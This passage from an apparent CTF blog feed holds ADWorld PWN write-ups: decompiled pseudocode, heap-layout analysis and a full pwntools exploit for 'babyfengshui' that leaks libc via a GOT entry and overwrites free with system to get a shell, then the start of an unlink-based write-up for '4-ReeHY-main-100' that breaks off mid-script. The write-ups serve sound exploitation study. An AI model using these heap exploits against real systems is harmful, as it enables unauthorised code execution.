&amp;v3, &amp;v2);</span><br><span class="line">    <span class="keyword">if</span> ( (v3 + *ptr[a1]) &gt;= ptr[a1] - <span class="number">4</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;my l33t defenses cannot be fooled, cya!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;text: &quot;</span>);</span><br><span class="line">    <span class="built_in">read_name</span>(*ptr[a1], v3 + <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>delete</code>:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> __cdecl <span class="title">delete</span><span class="params">(<span class="keyword">unsigned</span> __int8 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( a1 &lt; user_index &amp;&amp; ptr[a1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(*ptr[a1]);</span><br><span class="line">    <span class="built_in">free</span>(ptr[a1]);</span><br><span class="line">    ptr[a1] = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>display</code>:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> __cdecl <span class="title">display</span><span class="params">(<span class="keyword">unsigned</span> __int8 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( a1 &lt; user_index &amp;&amp; ptr[a1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;name: %s\n&quot;</span>, ptr[a1] + <span class="number">4</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;description: %s\n&quot;</span>, *ptr[a1]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Analysis-2"><a href="#Analysis-2" class="headerlink" title="Analysis"></a>Analysis</h3><p>We can see in <code>delete()</code> it set pointers as <code>NULL</code> which leads to no <code>UAF</code>.</p>
<p>From <code>add()</code> we can find that in <code>ptr</code> it stores a structure:<br><img src="/imghost/apcaw/hg2.svg" alt="Struct"><br>This explains why in <code>update()</code> it checks <code>(v3 + *ptr[a1]) &gt;= ptr[a1] - 4</code>, because it looks right. The content of <code>s</code> should not disturb the <code>size</code> of chunk <code>v2</code> (<code>prev_size</code> is used by <code>s</code>). </p>
<p>The question is: it works only when chunk <code>v2</code> and chunk <code>s</code> are adjacent!!!</p>
<p>If we add 2 <code>0x80</code> user first:<br><img src="/imghost/apcaw/hg3.svg" alt="Step 1"><br>Then free <code>user0</code>:<br><img src="/imghost/apcaw/hg4.svg" alt="Step 2"><br>Then add a <code>0x100</code> user, you will see:<br><img src="/imghost/apcaw/hg5.svg" alt="Step 3"><br>Now the <code>v2</code> and <code>s</code> of <code>user2</code> are not adjacent, so the restriction in <code>update()</code> can be bypassed.</p>
<p>Next we hijack <code>GOT</code> (without <code>atoi</code>, we use <code>free</code>), leak <code>libc</code> base address and calculate <code>system</code> to execute.  </p>
<h3 id="Exploit-2"><a href="#Exploit-2" class="headerlink" title="Exploit"></a>Exploit</h3><p>The given <code>libc</code> is 2.19 but on remote that’s 2.23 (using <code>Libcsearcher</code> to get).</p>
<p>It got <code>alarm()</code> inside, and <code>LibcSearcher</code> takes too much time, so we use <code>ELF</code> module in <code>pwntools</code> to load <code>libc</code> and calculate address.</p>
<p>While <code>/lib32/libc.so.6</code> on ubuntu16.04 is also improper, so I choose to use <code>libc6-i386_2.23-0ubuntu10_amd64</code> in the database of <code>LibcSearcher</code>, and it works.</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">sh = process(<span class="string">&#x27;./babyfengshui&#x27;</span>)</span><br><span class="line">sh = remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="string">&#x27;57400&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./babyfengshui&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;/lib32/libc.so.6&#x27;)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;libc6-i386_2.23-0ubuntu10_amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size, name, text</span>):</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;Action: &#x27;</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;size of description: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;name: &#x27;</span>,name)</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;text length: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;text: &#x27;</span>,text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;Action: &#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;index: &#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">display</span>(<span class="params">index</span>):</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;Action: &#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;index: &#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update</span>(<span class="params">index, length, text</span>):</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;Action: &#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;index: &#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;text length: &#x27;</span>, <span class="built_in">str</span>(length))</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;text: &#x27;</span>,text)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;index0&#x27;</span>,<span class="string">&#x27;text0&#x27;</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;index1&#x27;</span>,<span class="string">&#x27;text1&#x27;</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;index2&#x27;</span>,<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;index2&#x27;</span>,<span class="string">&#x27;text2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x100</span>+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0x91</span>)+<span class="string">&#x27;b&#x27;</span>*<span class="number">0x80</span>+p32(<span class="number">0</span>)+p32(<span class="number">0x91</span>)+p32(elf.got[<span class="string">&#x27;free&#x27;</span>])</span><br><span class="line">update(<span class="number">3</span>,<span class="number">0x200</span>,payload)</span><br><span class="line">display(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;description: &#x27;</span>)</span><br><span class="line">free_addr = u32(sh.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(free_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_addr = free_addr - libc.symbols[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">system_addr = libc_addr + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr = libc_addr + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27; LibcSearcher takes too long</span></span><br><span class="line"><span class="string">libc = LibcSearcher(&#x27;free&#x27;,free_addr)  </span></span><br><span class="line"><span class="string">libc_base = free_addr - libc.dump(&#x27;free&#x27;)  </span></span><br><span class="line"><span class="string">system_addr = libc_base + libc.dump(&#x27;system&#x27;)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">update(<span class="number">1</span>,<span class="number">4</span>,p32(system_addr))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>linux</tag>
        <tag>stack-overflow</tag>
        <tag>ctf</tag>
        <tag>uaf</tag>
        <tag>heap</tag>
        <tag>got</tag>
      </tags>
  </entry>
  <entry>
    <title>ADWorld PWN Challenge Area Write-ups (Unlink)</title>
    <url>/2020/09/20/2020-09-20-ADWorld-PWN-Challenge-Area-Write-ups-Unlink/</url>
    <content><![CDATA[<h2 id="4-ReeHY-main-100"><a href="#4-ReeHY-main-100" class="headerlink" title="4-ReeHY-main-100"></a>4-ReeHY-main-100</h2><p>Attachment: <a href="/filehost/apcaw/4-ReeHY-main-100.zip">4-ReeHY-main-100.zip</a><br>Description: None</p>
<p>This challenge can be solved by using stack overflow, <code>GOT</code> hijacking, <code>unlink</code>, double free or some other tricks. </p>
<h3 id="Information"><a href="#Information" class="headerlink" title="Information"></a>Information</h3><p>Unzip first:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ unzip 4-ReeHY-main-100.zip</span><br><span class="line">Archive:  4-ReeHY-main-100.zip</span><br><span class="line">  inflating: ctflibc.so.6</span><br><span class="line">  inflating: 4-ReeHY-main</span><br></pre></td></tr></table></figure>
<p>Then check:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ file 4-ReeHY-main</span><br><span class="line">4-ReeHY-main: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=096967f69a5a1a6960ed59bd71560cb492db21a8, stripped</span><br><span class="line">$ checksec 4-ReeHY-main</span><br><span class="line">[*] &#x27;/root/4-ReeHY-main&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">$ chmod +x ctflibc.so.6</span><br><span class="line">$ ./ctflibc.so.6</span><br><span class="line">GNU C Library (GNU libc) stable release version 2.17, by Roland McGrath et al.</span><br><span class="line">Copyright (C) 2012 Free Software Foundation, Inc.</span><br><span class="line">This is free software; see the source for copying conditions.</span><br><span class="line">There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A</span><br><span class="line">PARTICULAR PURPOSE.</span><br><span class="line">Compiled by GNU CC version 4.8.5 20150623 (Red Hat 4.8.5-11).</span><br><span class="line">Compiled on a Linux 3.10.0 system on 2016-12-06.</span><br><span class="line">Available extensions:</span><br><span class="line">        The C stubs add-on version 2.1.2.</span><br><span class="line">        crypt add-on version 2.1 by Michael Glad and others</span><br><span class="line">        GNU Libidn by Simon Josefsson</span><br><span class="line">        Native POSIX Threads Library by Ulrich Drepper et al</span><br><span class="line">        BIND-8.2.3-T5B</span><br><span class="line">        RT using linux kernel aio</span><br><span class="line">libc ABIs: UNIQUE IFUNC</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;http://www.gnu.org/software/libc/bugs.html&gt;.</span><br></pre></td></tr></table></figure>
<p>Pseudocode:<br><code>main</code>:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 savedregs; <span class="comment">// [rsp+10h] [rbp+0h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">read_name</span>();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">menu</span>();</span><br><span class="line">    <span class="built_in">read_choice</span>();</span><br><span class="line">    <span class="built_in"><span class="keyword">switch</span></span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;savedregs )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1u</span>:</span><br><span class="line">        <span class="built_in">create</span>();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2u</span>:</span><br><span class="line">        <span class="built_in"><span class="keyword">delete</span></span>();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3u</span>:</span><br><span class="line">        <span class="built_in">edit</span>();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4u</span>:</span><br><span class="line">        <span class="built_in">show</span>();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5u</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;bye~bye~ young hacker&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Invalid Choice!&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>read_name</code>:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">read_name</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *buf; <span class="comment">// ST08_8</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">setvbuf</span>(stdout, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stdin, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stderr, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  size_list = (__int64)<span class="built_in">malloc</span>(<span class="number">0x14</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input your name: &quot;</span>);</span><br><span class="line">  <span class="built_in">write</span>(<span class="number">1</span>, <span class="string">&quot;$ &quot;</span>, <span class="number">2uLL</span>);</span><br><span class="line">  buf = <span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, buf, <span class="number">0x20</span>uLL);</span><br><span class="line">  <span class="built_in">write</span>(<span class="number">1</span>, <span class="string">&quot;Hello &quot;</span>, <span class="number">6uLL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>create</code>:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> <span class="keyword">int</span> <span class="title">create</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-90h]</span></span><br><span class="line">  <span class="keyword">void</span> *dest; <span class="comment">// [rsp+80h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+88h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">size_t</span> nbytes; <span class="comment">// [rsp+8Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  result = total_num;</span><br><span class="line">  <span class="keyword">if</span> ( total_num &lt;= <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Input size&quot;</span>);</span><br><span class="line">    result = <span class="built_in">read_choice</span>();</span><br><span class="line">    <span class="built_in">LODWORD</span>(nbytes) = result;</span><br><span class="line">    <span class="keyword">if</span> ( result &lt;= <span class="number">4096</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Input cun&quot;</span>);</span><br><span class="line">      result = <span class="built_in">read_choice</span>();</span><br><span class="line">      v3 = result;</span><br><span class="line">      <span class="keyword">if</span> ( result &lt;= <span class="number">4</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        dest = <span class="built_in">malloc</span>((<span class="keyword">signed</span> <span class="keyword">int</span>)nbytes);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Input content&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)nbytes &gt; <span class="number">112</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">read</span>(<span class="number">0</span>, dest, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)nbytes);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)nbytes);</span><br><span class="line">          <span class="built_in">memcpy</span>(dest, &amp;buf, (<span class="keyword">signed</span> <span class="keyword">int</span>)nbytes);</span><br><span class="line">        &#125;</span><br><span class="line">        *(_DWORD *)(size_list + <span class="number">4LL</span> * v3) = nbytes;</span><br><span class="line">        *((_QWORD *)&amp;content_list + <span class="number">2</span> * v3) = dest;</span><br><span class="line">        exist_flag[<span class="number">4</span> * v3] = <span class="number">1</span>;</span><br><span class="line">        ++total_num;</span><br><span class="line">        result = <span class="built_in">fflush</span>(stdout);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>delete</code>:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Chose one to dele&quot;</span>);</span><br><span class="line">  result = <span class="built_in">read_choice</span>();</span><br><span class="line">  v1 = result;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)result &lt;= <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(*((<span class="keyword">void</span> **)&amp;content_list + <span class="number">2</span> * (<span class="keyword">signed</span> <span class="keyword">int</span>)result));</span><br><span class="line">    exist_flag[<span class="number">4</span> * v1] = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;dele success!&quot;</span>);</span><br><span class="line">    result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(total_num-- - <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>edit</code>:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> <span class="keyword">int</span> <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Chose one to edit&quot;</span>);</span><br><span class="line">  result = <span class="built_in">read_choice</span>();</span><br><span class="line">  v1 = result;</span><br><span class="line">  <span class="keyword">if</span> ( result &lt;= <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = exist_flag[<span class="number">4</span> * result];</span><br><span class="line">    <span class="keyword">if</span> ( result == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Input the content&quot;</span>);</span><br><span class="line">      <span class="built_in">read</span>(<span class="number">0</span>, *((<span class="keyword">void</span> **)&amp;content_list + <span class="number">2</span> * v1), *(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(<span class="number">4LL</span> * v1 + size_list));</span><br><span class="line">      result = <span class="built_in">puts</span>(<span class="string">&quot;Edit success!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Some addresses:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.bss:0000000000602080 stdout          dq ?                    ; DATA XREF: LOAD:0000000000400400↑o</span><br><span class="line">.bss:0000000000602090 stdin           dq ?                    ; DATA XREF: LOAD:0000000000400418↑o</span><br><span class="line">.bss:00000000006020A0 stderr          dq ?                    ; DATA XREF: LOAD:0000000000400430↑o</span><br><span class="line">.bss:00000000006020AC total_num       dd ?                    ; DATA XREF: create+B↑r</span><br><span class="line">.bss:00000000006020C0 size_list       dq ?                    ; DATA XREF: read_name+6C↑w</span><br><span class="line">.bss:00000000006020E0 content_list    db    ? ;               ; DATA XREF: create+FE↑o</span><br><span class="line">.bss:00000000006020E8 exist_flag      dd 10h dup(?)           ; DATA XREF: create+119↑o</span><br></pre></td></tr></table></figure>
<p>Sub functions (<code>menu</code>, <code>read_choice</code> and <code>show</code>) are either simple or not constructed.<br>Rename some items for simplification.</p>
<h3 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h3><p>Though in <code>delete()</code> it doesn’t set freed pointer as <code>NULL</code>, it uses <code>exist_flag</code> as flag and check it in <code>edit</code>, so <code>UAF</code> cannot be down, but here we can build a double free.<br>Double free often works for <code>fastbin</code> attack and <code>unlink</code>. This time, I will show you how to exploit <code>unlink</code> (it doesn’t need double free yet).</p>
<p>The <code>unlink</code> occurs only when you free a chunk, and a freed chunk (not in fastbin) is next to it. Then that freed chunk will be unlinked (that’s where <code>unlink</code> happens) from its bin list, and merged with your newly freed chunk.  </p>
<p>Basic principle of exploiting <code>unlink</code> will be posted as another essay. It needs to fake one chunk’s <code>fd</code> and <code>bk</code> as <code>target-0x18</code> and <code>target-0x10</code>, and you get <code>*target = target-0x18</code> as a result after <code>unlink</code>.</p>
<p>Back to this task. In <code>read_name()</code>:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">size_list = (__int64)<span class="built_in">malloc</span>(<span class="number">0x14</span>uLL);</span><br></pre></td></tr></table></figure>
<p>In <code>create()</code>:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">*(_DWORD *)(size_list + <span class="number">4LL</span> * v3) = nbytes;</span><br><span class="line">*((_QWORD *)&amp;content_list + <span class="number">2</span> * v3) = dest;</span><br><span class="line">exist_flag[<span class="number">4</span> * v3] = <span class="number">1</span>;</span><br></pre></td></tr></table></figure>
<p>According to their addresses we know that <code>size_list</code> is a <code>0x14</code> array to store content size.<br>The <code>content_list</code> and <code>exist_flag</code> can be regarded as a structure which is <code>0x10</code> long, <code>0x8</code> for <code>content_list</code> which stores pointer of <code>content</code>, and the rest for <code>exist_flag</code> which stores <code>content</code> size.<br><img src="/imghost/apcaw/u1.svg" alt="u1.svg"></p>
<p>We can hijack <code>GOT</code> to leak <code>libc</code> base address and get shell, the point is how to edit <code>GOT</code> items.<br>The <code>edit()</code> is to edit what <code>content_list</code> items point to, so we try <code>unlink</code> to change what they point as <code>GOT</code> items.</p>
<p>First we create 2 chunks with index <code>0</code> and <code>1</code><br><img src="/imghost/apcaw/u2.svg" alt="u2.svg"></p>
<p>Then we fake a freed chunk in chunk <code>0</code> waiting for <code>unlink</code>. </p>
<p>To set it as freed, the <code>prev_size</code> of chunk <code>1</code> should be the faked chunk’s size, but the size of chunk <code>0</code> in <code>size_list</code> cannot let us overflow <code>prev_size</code> of chunk <code>1</code>. So we have to edit <code>size_list</code> first.</p>
<p>In <code>create()</code> the <code>cun</code> can be negative, which leads us to access things ahead of <code>content_list</code>, so do <code>delete()</code>. If we set index as <code>-2</code> we will access <code>size_list</code>. </p>
<p>One way is to <code>delete()</code> the <code>size_list</code> first to put it in fastbin (it is <code>0x14</code>), then <code>create()</code> a chunk <code>2</code> in <code>0x10-0x18</code> to get that back into control and edit.<br><img src="/imghost/apcaw/u3.svg" alt="u3.svg"><br>Another way is to <code>create()</code> with index <code>-2</code>, which <code>malloc</code> a new controllable space for <code>size_list</code>, but remember to set <code>content</code> size of others right.<br><img src="/imghost/apcaw/u4.svg" alt="u4.svg"></p>
<p>Anyway we control the <code>size_list</code>, and it’s easy to set chunk <code>0</code> big enough to enable faking chunk. Let’s fake one:<br><img src="/imghost/apcaw/u5.svg" alt="u5.svg"><br>Things in red is our fake chunk, and we overflow <code>prev_size</code> and <code>prev_inuse</code> in <code>size</code> of chunk <code>1</code> to indicate that this chunk is freed, ready to <code>unlink</code>.</p>
<p>Then we free chunk <code>1</code>, which <code>unlink</code> fake chunk and get <code>*content_list = content_list-0x18</code>.<br><img src="/imghost/apcaw/u6.svg" alt="u6.svg"><br>It sometimes is confusing because we do not know clearly how to exploit it. Well, here we can overflow <code>content_list</code> items as <code>GOT</code> items and set all <code>exist_flag</code> as <code>1</code>, then use <code>edit()</code> to hijack <code>GOT</code>. </p>
<p>Check the exploit script for details.</p>
<p>Besides there is also a <code>stackoverflow</code> in <code>create()</code>. it reads <code>size</code> and use it as <code>signed int</code> to <code>malloc</code>, while as <code>unsigned int</code> to <code>read</code>, so here exists a integer overflow.</p>
<p>Set <code>size</code> as ‘-1’ and in <code>read</code> it will read <code>0xffffffff</code> chars to <code>buf</code> on stack. But there is a <code>memcpy(dest, &amp;buf, (signed int)nbytes);</code> to execute, so when overflow we have to set their value (<code>dest</code>, <code>buf</code>, <code>nbytes</code>) right.</p>
<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><p>Using <code>unlink</code>:</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">sh = process(<span class="string">&#x27;./4-ReeHY-main&#x27;</span>)</span><br><span class="line">sh = remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="string">&#x27;32078&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./4-ReeHY-main&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./ctflibc.so.6&#x27;</span>)</span><br><span class="line">size_list = <span class="number">0x6020C0</span></span><br><span class="line">content_list = <span class="number">0x6020E0</span></span><br><span class="line">exist_flag = <span class="number">0x6020E8</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span 